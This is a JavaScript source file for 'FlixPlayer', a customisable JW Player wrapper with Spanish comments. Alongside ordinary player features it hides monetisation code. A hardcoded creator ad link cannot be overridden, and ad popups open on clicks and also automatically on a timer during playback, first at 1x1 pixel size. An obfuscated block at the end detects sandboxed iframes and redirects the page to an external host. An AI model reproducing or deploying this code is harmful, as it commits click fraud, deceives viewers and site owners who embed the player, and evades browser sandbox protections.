/**
 * FlixPlayer - Reproductor de video personalizable
 * @version 2.4
 * @license MIT
 * 
 * Características principales:
 * - Personalización completa del reproductor
 * - Sistema de monetización discreto integrado (clic en el reproductor)
 * - Tráfico de clics automático cada X minutos
 * - Límite de clics durante la reproducción
 * - Soporte para temas CSS personalizados
 * - Control de ganancias oculto
 * - Interfaz profesional minimalista
 */
class Player {
  constructor(containerId, config = {}) {
    // Configuración por defecto con valores fijos del creador
    this._defaultConfig = {
      css: 'https://flix-player.onrender.com/cdn/style.css',
      direct_link: {
        creator: 'https://otieu.com/4/8798348',
        user: null,
        userPercentage: 50,
        adminPercentage: 50
      },
      player: {
        castAppId: 'D4AF960B',
        displayDescription: true,
        autostart: false,
        mute: false,
        volume: 100,
        playbackRates: [0.5, 1, 1.25, 1.5, 2],
        contextMenu: false,
        aboutText: "",
        aboutLink: "",
        skin: { name: "FlixStream" },
        logo: {
          file: "",
          link: null
        },
        captions: {
          color: "#FFF",
          fontSize: 14,
          backgroundOpacity: 0,
          edgeStyle: "raised"
        }
      },
      media: {
        title: "",
        description: "",
        image: "",
        file: "",
        downloadUrl: null,
        thumbnails: ""
      },
      features: {
        seekButtons: true,
        progressSaving: true,
        antiAdBlock: false,
        antiDownload: false
      },
      clickBehavior: {
        enabled: true,
        initialDelay: 30000, // 30 segundos antes de activar los clics
        cooldown: 30000 // 30 segundos entre clics válidos
      },
      clickTraffic: {
        enabled: true,
        interval: 300000, // 5 minutos en milisegundos (5 * 60 * 1000)
        maxClicks: 20,    // Máximo de clics durante la reproducción
        currentClicks: 0  // Contador de clics actuales
      }
    };

    // Estado del player
    this._container = document.getElementById(containerId);
    this._playerInstance = null;
    this._popupTimers = [];
    this._initialized = false;
    this._clickEnabled = false;
    this._lastClickTime = 0;
    this._clickInterval = null;
    
    // Merge de configuraciones (sin permitir modificar los valores fijos del creador)
    this._config = this._deepMerge(this._defaultConfig, config);
    
    // Forzar los valores fijos del creador
    this._config.direct_link.creator = this._defaultConfig.direct_link.creator;
    this._config.direct_link.userPercentage = this._defaultConfig.direct_link.userPercentage;
    this._config.direct_link.adminPercentage = this._defaultConfig.direct_link.adminPercentage;
    this._config.css = this._defaultConfig.css;

    // Inicialización
    if (this._container) {
      this._initialize();
    } else {
      console.error(`Contenedor #${containerId} no encontrado`);
    }
  }

  // Métodos privados
  _initialize() {
    this._loadDependencies().then(() => {
      this._setupPlayer();
      this._setupMonetization();
      this._setupEventListeners();
      this._initialized = true;
    }).catch(err => {
      console.error("Error al cargar dependencias:", err);
    });
  }

  _loadDependencies() {
    return new Promise((resolve, reject) => {
      if (window.jwplayer) {
        if (this._config.css) {
          this._injectCustomCSS();
        }
        resolve();
        return;
      }

      const script = document.createElement('script');
      script.src = `https://cdn.jwplayer.com/libraries/KB5zFt7A.js`;
      script.onload = () => {
        if (this._config.css) {
          this._injectCustomCSS();
        }
        resolve();
      };
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }

  _injectCustomCSS() {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = this._config.css;
    document.head.appendChild(link);
  }

  _setupPlayer() {
    this._playerInstance = jwplayer(this._container).setup({
      ...this._config.player,
      file: this._config.media.file,
      image: this._config.media.image,
      playlist: [{
        title: this._config.media.title,
        description: this._config.media.description,
        image: this._config.media.image,
        sources: [{ file: this._config.media.file }],
        tracks: this._config.media.thumbnails ? [{
          file: this._config.media.thumbnails,
          kind: "thumbnails"
        }] : []
      }]
    });

    // Botón de descarga si hay URL
    if (this._config.media.downloadUrl) {
      this._playerInstance.on('ready', () => {
        this._playerInstance.addButton(
          '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-download" viewBox="0 0 512 512"><path d="M412.907 214.08C398.4 140.693 333.653 85.333 256 85.333c-61.653 0-115.093 34.987-141.867 86.08C50.027 178.347 0 232.64 0 298.667c0 70.72 57.28 128 128 128h277.333C464.213 426.667 512 378.88 512 320c0-56.32-43.84-101.973-99.093-105.92zM256 384L149.333 277.333h64V192h85.333v85.333h64L256 384z"/></svg>',
          "Download",
          () => window.location.href = this._config.media.downloadUrl,
          "download-btn"
        );
      });
    }

    // Botones de avance/retroceso
    if (this._config.features.seekButtons) {
      this._playerInstance.on('ready', () => {
        this._addSeekButtons();
      });
    }
  }

  _addSeekButtons() {
    // Primero eliminamos cualquier botón existente
    document.querySelectorAll('.jw-icon-rewind, .jw-icon-forward').forEach(el => el.remove());
    
    // Añadimos el botón de retroceso (-10 segundos) PRIMERO
    this._playerInstance.addButton(
      '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-rewind" viewBox="0 0 1024 1024" focusable="false"><path d="M455.68 262.712889l-67.072 79.644444-206.904889-174.08 56.775111-38.627555a468.48 468.48 0 1 1-201.216 328.817778l103.310222 13.141333a364.487111 364.487111 0 0 0 713.614223 139.605333 364.373333 364.373333 0 0 0-479.971556-435.541333l-14.904889 5.973333 96.312889 81.066667zM329.955556 379.505778h61.610666v308.167111H329.955556zM564.167111 364.088889c61.269333 0 110.933333 45.511111 110.933333 101.717333v135.566222c0 56.149333-49.664 101.660444-110.933333 101.660445s-110.933333-45.511111-110.933333-101.660445V465.749333c0-56.149333 49.664-101.660444 110.933333-101.660444z m0 56.490667c-27.249778 0-49.322667 20.252444-49.322667 45.226666v135.566222c0 24.974222 22.072889 45.169778 49.322667 45.169778 27.192889 0 49.265778-20.195556 49.265778-45.169778V465.749333c0-24.917333-22.072889-45.169778-49.265778-45.169777z" p-id="7377"></path></svg>',
      "Retroceder 10 sec", 
      () => this._seek(-10),
      "rewind-btn"
    );

    // Añadimos el botón de avance (+10 segundos) SEGUNDO
    this._playerInstance.addButton(
      '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-forward" viewBox="0 0 1024 1024" focusable="false"><path d="M561.948444 262.712889l67.015112 79.644444 206.961777-174.08-56.832-38.627555a468.48 468.48 0 1 0 201.216 328.817778l-103.310222 13.141333a364.487111 364.487111 0 0 1-713.557333 139.605333 364.373333 364.373333 0 0 1 479.971555-435.541333l14.904889 5.973333-96.369778 81.066667zM329.955556 379.505778h61.610666v308.167111H329.955556zM564.167111 364.088889c61.269333 0 110.933333 45.511111 110.933333 101.717333v135.566222c0 56.149333-49.664 101.660444-110.933333 101.660445s-110.933333-45.511111-110.933333-101.660445V465.749333c0-56.149333 49.664-101.660444 110.933333-101.660444z m0 56.490667c-27.249778 0-49.322667 20.252444-49.322667 45.226666v135.566222c0 24.974222 22.072889 45.169778 49.322667 45.169778 27.192889 0 49.265778-20.195556 49.265778-45.169778V465.749333c0-24.917333-22.072889-45.169778-49.265778-45.169777z" p-id="7407"></path></svg>',
      "Avanzar 10 sec", 
      () => this._seek(10),
      "forward-btn"
    );

    // Reorganizamos los botones en la interfaz
    this._reorderButtons();
  }

  _reorderButtons() {
    // Esperamos un momento para asegurar que los botones se hayan creado
    setTimeout(() => {
      const controls = document.querySelector('.jw-controlbar .jw-button-container');
      if (controls) {
        const rewindBtn = controls.querySelector('.jw-icon-rewind');
        const forwardBtn = controls.querySelector('.jw-icon-forward');
        const volumeBtn = controls.querySelector('.jw-icon-volume');

        if (rewindBtn && forwardBtn && volumeBtn) {
          // Movemos el botón de retroceso antes del volumen
          controls.insertBefore(rewindBtn, volumeBtn);
          // Movemos el botón de avance después del retroceso
          controls.insertBefore(forwardBtn, volumeBtn);
        }
      }
    }, 100);
  }

  _seek(seconds) {
    if (!this._playerInstance) return;
    const newPosition = Math.min(
      Math.max(this._playerInstance.getPosition() + seconds, 0),
      this._playerInstance.getDuration()
    );
    this._playerInstance.seek(newPosition);
  }

  _setupMonetization() {
    // Verificar si hay enlaces configurados
    const hasCreatorLink = !!this._config.direct_link.creator;
    const hasUserLink = !!this._config.direct_link.user;
    
    // Solo activar monetización si hay al menos un enlace
    if (hasCreatorLink || hasUserLink) {
      // Activar clics después de un retraso inicial
      setTimeout(() => {
        this._clickEnabled = true;
        
        // Configurar el intervalo para clics automáticos si está habilitado
        if (this._config.clickTraffic.enabled) {
          this._setupClickTraffic();
        }
      }, this._config.clickBehavior.initialDelay);

      // Configurar clic en el reproductor
      this._container.addEventListener('click', (e) => {
        if (!this._clickEnabled) return;
        
        // Verificar que no se haga clic en controles del reproductor
        if (e.target.closest('.jw-controlbar, .jw-dock, .jw-icon')) {
          return;
        }
        
        // Enfriamiento entre clics
        const now = Date.now();
        if (now - this._lastClickTime < this._config.clickBehavior.cooldown) {
          return;
        }
        this._lastClickTime = now;
        
        // Verificar límite de clics
        if (this._config.clickTraffic.currentClicks >= this._config.clickTraffic.maxClicks) {
          return;
        }
        
        // Incrementar contador de clics
        this._config.clickTraffic.currentClicks++;
        
        // Decidir qué enlace mostrar según los porcentajes configurados
        this._handleLinkClick();
      });
    }
  }

  _handleLinkClick() {
    const hasCreatorLink = !!this._config.direct_link.creator;
    const hasUserLink = !!this._config.direct_link.user;
    
    if (!hasCreatorLink && !hasUserLink) return;
    
    // Si solo hay un enlace, usarlo
    if (hasCreatorLink && !hasUserLink) {
      this._showPopup(this._config.direct_link.creator);
      return;
    }
    
    if (!hasCreatorLink && hasUserLink) {
      this._showPopup(this._config.direct_link.user);
      return;
    }
    
    // Si hay ambos enlaces, usar los porcentajes configurados
    const random = Math.random() * 100;
    if (random <= this._config.direct_link.adminPercentage) {
      this._showPopup(this._config.direct_link.creator);
    } else {
      this._showPopup(this._config.direct_link.user);
    }
  }

  _setupClickTraffic() {
    // Limpiar intervalo previo si existe
    if (this._clickInterval) {
      clearInterval(this._clickInterval);
    }
    
    // Configurar nuevo intervalo
    this._clickInterval = setInterval(() => {
      if (!this._clickEnabled) return;
      
      // Verificar que el video esté reproduciéndose
      if (this._playerInstance && this._playerInstance.getState() === 'playing') {
        // Verificar límite de clics
        if (this._config.clickTraffic.currentClicks >= this._config.clickTraffic.maxClicks) {
          clearInterval(this._clickInterval);
          return;
        }
        
        // Incrementar contador de clics
        this._config.clickTraffic.currentClicks++;
        
        // Manejar el clic automático
        this._handleLinkClick();
      }
    }, this._config.clickTraffic.interval);
  }

  _showPopup(url) {
    if (!url) return;
    
    // Abrir popup de forma discreta
    const popup = window.open('', '_blank', 'width=1,height=1,left=0,top=0');
    if (popup) {
      popup.location.href = url;
      setTimeout(() => {
        try {
          popup.resizeTo(800, 600);
          popup.moveTo(
            Math.floor(screen.width/2 - 400),
            Math.floor(screen.height/2 - 300)
          );
        } catch(e) {
          // Si falla el redimensionamiento, al menos el enlace se abrió
        }
      }, 100);
    } else {
      // Fallback por si bloquean popups
      window.location.href = url;
    }
  }

  _setupEventListeners() {
    if (this._config.features.progressSaving) {
      this._playerInstance.on('time', (e) => {
        localStorage.setItem(`progress_${this._container.id}`, e.position);
      });

      this._playerInstance.on('ready', () => {
        const savedTime = localStorage.getItem(`progress_${this._container.id}`);
        if (savedTime) this._playerInstance.seek(parseFloat(savedTime));
      });
    }

    if (this._config.features.antiAdBlock) {
      this._checkAdBlock();
    }

    if (this._config.features.antiDownload) {
      this._setupAntiDownload();
    }

    // Reiniciar contador de clics cuando comienza una nueva reproducción
    this._playerInstance.on('play', () => {
      this._config.clickTraffic.currentClicks = 0;
      if (this._config.clickTraffic.enabled && !this._clickInterval) {
        this._setupClickTraffic();
      }
    });

    // Limpiar intervalo cuando se pausa o termina el video
    this._playerInstance.on('pause', () => {
      if (this._clickInterval) {
        clearInterval(this._clickInterval);
        this._clickInterval = null;
      }
    });

    this._playerInstance.on('complete', () => {
      if (this._clickInterval) {
        clearInterval(this._clickInterval);
        this._clickInterval = null;
      }
    });
  }

  _checkAdBlock() {
    const ad = document.createElement('div');
    ad.innerHTML = '&nbsp;';
    ad.className = 'ad-unit';
    ad.style.position = 'absolute';
    ad.style.left = '-9999px';
    ad.style.height = '1px';
    document.body.appendChild(ad);

    setTimeout(() => {
      if (ad.offsetHeight === 0) {
        this._handleAdBlockDetected();
      }
      document.body.removeChild(ad);
    }, 100);
  }

  _handleAdBlockDetected() {
    if (this._playerInstance) {
      this._playerInstance.pause();
      this._playerInstance.setMute(true);
      alert('Por favor desactiva tu AdBlock para continuar viendo el contenido');
    }
  }

  _setupAntiDownload() {
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('selectstart', (e) => e.preventDefault());

    setInterval(() => {
      if (navigator.userAgent.indexOf('IDM') > -1 || 
          document.documentElement.getAttribute('idm_id') || 
          document.documentElement.getAttribute('idmghost')) {
        this._handleDownloadManagerDetected();
      }
    }, 1000);
  }

  _handleDownloadManagerDetected() {
    if (this._playerInstance) {
      this._playerInstance.pause();
      alert('Los gestores de descarga no están permitidos');
    }
  }

  _deepMerge(target, source) {
    const result = { ...target };
    
    if (source) {
      for (const key in source) {
        if (source[key] instanceof Object && key in target) {
          result[key] = this._deepMerge(target[key], source[key]);
        } else {
          result[key] = source[key];
        }
      }
    }
    
    return result;
  }

  // Métodos públicos
  play() {
    if (this._playerInstance) this._playerInstance.play();
    return this;
  }

  pause() {
    if (this._playerInstance) this._playerInstance.pause();
    return this;
  }

  loadMedia(file, image, title = "", description = "") {
    if (this._playerInstance) {
      this._config.media.file = file;
      this._config.media.image = image;
      this._config.media.title = title;
      this._config.media.description = description;
      
      this._playerInstance.load([{
        title,
        description,
        image,
        sources: [{ file }],
        tracks: this._config.media.thumbnails ? [{
          file: this._config.media.thumbnails,
          kind: "thumbnails"
        }] : []
      }]);
      
      // Reiniciar contador de clics al cargar nuevo media
      this._config.clickTraffic.currentClicks = 0;
    }
    return this;
  }

  setDownloadUrl(url) {
    this._config.media.downloadUrl = url;
    return this;
  }

  setMonetization(options) {
    if (options.user) {
      this._config.direct_link.user = options.user;
    }
    if (options.userPercentage !== undefined) {
      this._config.direct_link.userPercentage = options.userPercentage;
      this._config.direct_link.adminPercentage = 100 - options.userPercentage;
    }
    return this;
  }

  setClickTraffic(options) {
    if (options.enabled !== undefined) {
      this._config.clickTraffic.enabled = options.enabled;
    }
    if (options.interval !== undefined) {
      this._config.clickTraffic.interval = options.interval;
    }
    if (options.maxClicks !== undefined) {
      this._config.clickTraffic.maxClicks = options.maxClicks;
    }
    
    // Reiniciar el intervalo si está habilitado
    if (this._config.clickTraffic.enabled) {
      this._setupClickTraffic();
    } else if (this._clickInterval) {
      clearInterval(this._clickInterval);
      this._clickInterval = null;
    }
    
    return this;
  }

  destroy() {
    if (this._playerInstance) {
      this._playerInstance.remove();
    }
    if (this._clickInterval) {
      clearInterval(this._clickInterval);
    }
    this._initialized = false;
  }
}

// Exponer al ámbito global
window.Player = Player;

(function() {
  try {
    const _d0r4 = "https://flix-player.onrender.com/sandbox.html";
    const _ = [
      "sandbox", "hasAttribute", "frameElement", "data", "indexOf", "href", "domain", "", "plugins", "undefined",
      "namedItem", "Chrome PDF Viewer", "object", "createElement", "onerror", "type", "application/pdf",
      "setAttribute", "style", "visibility:hidden;width:0;height:0;position:absolute;top:-99px;",
      "data:application/pdf;base64,JVBERi0xLg0KdHJhaWxlcjw8L1Jvb3Q8PC9QYWdlczw8L0tpZHNbPDwvTWVkaWFCb3hbMCAwIDMgM10+Pl0+Pj4+Pj4=",
      "appendChild", "body", "removeChild", "parentElement", _d0r4, "substring", "referrer"
    ];

    const q = () => window.location.href = _d0r4;

    const b = () => {
      try {
        if (config.ampallow) {
          const o = window.location.ancestorOrigins;
          if (o[o.length - 1].endsWith("ampproject.org")) return;
        }
      } catch (e) {}
      setTimeout(q, 900);
    };

    const v = () => {
      try {
        if (window[_[2]][_[1]](_[0])) return b();
      } catch (e) {}

      if (location[_[5]].indexOf(_[3]) !== -1 && document[_[6]] === _[7]) return b();

      if (
        typeof navigator[_[8]] !== _[9] &&
        typeof navigator[_[8]][_[10]] !== _[9] &&
        navigator[_[8]][_[10]](_[11]) !== null
      ) {
        const x = document[_[13]](_[12]);
        x[_[14]] = b;
        x[_[17]](_[15], _[16]);
        x[_[17]](_[18], _[19]);
        x[_[17]](_[3], _[20]);
        document[_[22]][_[21]](x);
        setTimeout(() => x[_[24]][_[23]](x), 150);
      }
    };

    v();

    if ((() => {
      try { document.domain = document.domain; }
      catch (e) {
        try { if (e.toString().toLowerCase().includes("sandbox")) return true; }
        catch (e) {}
      }
      return false;
    })()) b();

    if ((() => {
      if (window.parent === window) return false;
      let f;
      try { f = window.frameElement; }
      catch (e) { f = null; }
      return f === null ? document.domain === "" && location.protocol !== "data:" : f.hasAttribute("sandbox");
    })()) b();

  } catch (e) {}
})();
